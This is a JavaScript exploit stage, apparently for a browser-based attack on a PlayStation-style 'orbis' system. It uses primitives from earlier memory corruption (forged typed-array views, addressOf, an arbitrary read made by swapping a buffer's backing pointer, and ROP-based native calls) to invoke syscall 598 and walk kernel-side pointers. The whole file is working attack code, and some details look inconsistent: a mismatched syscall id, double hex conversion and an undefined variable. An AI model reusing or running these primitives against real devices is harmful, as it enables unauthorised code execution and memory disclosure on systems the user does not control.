// Fresh-root orbis walk: derives the root address from 598 on THIS boot,
// reads the root structure, extracts pointers, and follows each one.
// NEVER uses stale addresses â€” everything is derived from the current
// session's 598 call. Read-only; wrappers from installer v21.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !state.view || !state.array || !state.a || !state.ownedTypedView ||
      !Number.isSafeInteger(state.calibratedViewBase) ||
      state.array[0] !== state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase) ||
      typeof native.wrappers.sys598 !== "number")
    throw new Error("held_plan_missing");
  var forged = state.view;
  var carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (carrier.length !== 65536 || carrier[0] !== 0x31 ||
      carrier[7] !== 0xa8 || base % 4096 !== 0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index, count) {
    var out = [];
    for (var n = 0; n < count; n++) out.push(forged[index + n]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var n = bytes.length - 1; n >= 0; n--)
      value = value * 256 + bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value < 0 ||
        value >= 0x1000000000000)
      throw new Error("pointer_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(value / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  var carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal = bytesAt(carrierSlot, 8);
  function readAt(addressValue, count) {
    if (!Number.isSafeInteger(addressValue) || count < 1 || count > 192)
      throw new Error("read_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      var out = [];
      for (var r = 0; r < count; r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function toHex(bytes) {
    var out = "";
    for (var i = 0; i < bytes.length; i++)
      out += ("0" + bytes[i].toString(16)).slice(-2);
    return out;
  }
  function toAscii(bytes) {
    var out = "";
    for (var i = 0; i < bytes.length; i++) {
      var ch = bytes[i];
      out += (ch >= 32 && ch < 127) ? String.fromCharCode(ch) : ".";
    }
    return out;
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("orbis_fresh_preflight");
  // Step 1: call 598 to get the root base for THIS boot
  phase = "call_598";
  var sizePtrOffset = 0x1e00;
  var rootBufOffset = 0x200;
  var rootBufLen = 0x1000;
  var regionEnd = sizePtrOffset + 0x20;
  if (regionEnd > plan.frame.length)
    throw new Error("frame_region_too_small");
  var rootBufAddress = plan.addresses.frame + rootBufOffset;
  var sizeAddress = plan.addresses.frame + sizePtrOffset;
  var sizeView = new DataView(plan.frame.buffer);
  var sizeOrig = sizeView.getUint32(sizePtrOffset, true);
  plan.frame.fill(0, rootBufOffset, rootBufOffset + rootBufLen);
  sizeView.setUint32(sizePtrOffset, 0x1000, true);
  sizeView.setUint32(sizePtrOffset + 4, 0, true);
  var call598 = native.call("sys598", [rootBufAddress, sizeAddress]);
  var errno598 = (call598.value === -1) ? native.readErrno() : null;
  var rootLo = (plan.frame[rootBufOffset]) |
               (plan.frame[rootBufOffset + 1] << 8) |
               (plan.frame[rootBufOffset + 2] << 16) |
               (plan.frame[rootBufOffset + 3] << 24);
  var rootHi = (plan.frame[rootBufOffset + 4]) |
               (plan.frame[rootBufOffset + 5] << 8) |
               (plan.frame[rootBufOffset + 6] << 16) |
               (plan.frame[rootBufOffset + 7] << 24);
  var rootBase = rootHi * 0x100000000 + rootLo;
  mark("orbis_fresh_598");
  if (rootBase < 0x1000 || rootBase >= 0x1000000000000)
    throw new Error("root_base_invalid_" + rootBase.toString(16));
  // Step 2: read the root structure (192 bytes)
  phase = "root_read";
  var rootBytes = readAt(rootBase, 192);
  var rootHex = toHex(rootBytes);
  var rootAscii = toAscii(rootBytes);
  mark("orbis_fresh_root_read");
  // Step 3: extract pointers from known offsets
  var ptrOffsets = [0x18, 0x20, 0x38, 0x40, 0x48, 0x70, 0x78];
  var ptrs = [];
  for (var p = 0; p < ptrOffsets.length; p++) {
    var off = ptrOffsets[p];
    if (off + 8 <= rootBytes.length) {
      var lo = valueOf(rootBytes.slice(off, off + 4));
      var hi = valueOf(rootBytes.slice(off + 4, off + 8));
      var ptr = hi * 0x100000000 + lo;
      if (ptr >= 0x1000 && ptr < 0x1000000000000)
        ptrs.push({ offset: off, addr: ptr });
    }
  }
  // Step 4: follow each pointer, 64B reads
  phase = "follow";
  var followResults = [];
  var followOk = 0;
  for (var f = 0; f < ptrs.length; f++) {
    var tgt = ptrs[f];
    mark("orbis_fresh_hop" + f + "_before");
    var fbytes = readAt(tgt.addr, 64);
    mark("orbis_fresh_hop" + f + "_after");
    followOk += 1;
    followResults.push("+" + tgt.offset.toString(16) + ":" +
      tgt.addr.toString(16) + "=" + toHex(fBytes(fbytes)) +
      "|" + toAscii(fbytes));
  }
  function fBytes(bytes) {
    return bytes.slice(0, 24).map(function (b) {
      return ("0" + b.toString(16)).slice(-2);
    }).join("");
  }
  var after = native.call("getpid", []);
  mark("orbis_fresh_done");
  var ptrList = "";
  for (var p2 = 0; p2 < ptrs.length; p2++) {
    ptrList += "+" + ptrs[p2].offset.toString(16) + ":" +
      ptrs[p2].addr.toString(16) + " ";
  }
  result = { id: "syscall557_confirm_v2",
    status: (after.value === before.value && after.high === 0 &&
      rootBase > 0) ? "pass" : "fail",
    details: { ret598: call598.value, errno598: errno598,
      root_base: rootBase.toString(16),
      root_hex: rootHex.slice(0, 380),
      root_ascii: rootAscii.slice(0, 190),
      ptrs: ptrList.trim(),
      hop_count: followOk,
      hops: followResults.join(" | ").slice(0, 512),
      pid_ok: after.value === before.value && after.high === 0 } };
} catch (error) {
  result = { id: "syscall557_confirm_v2", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
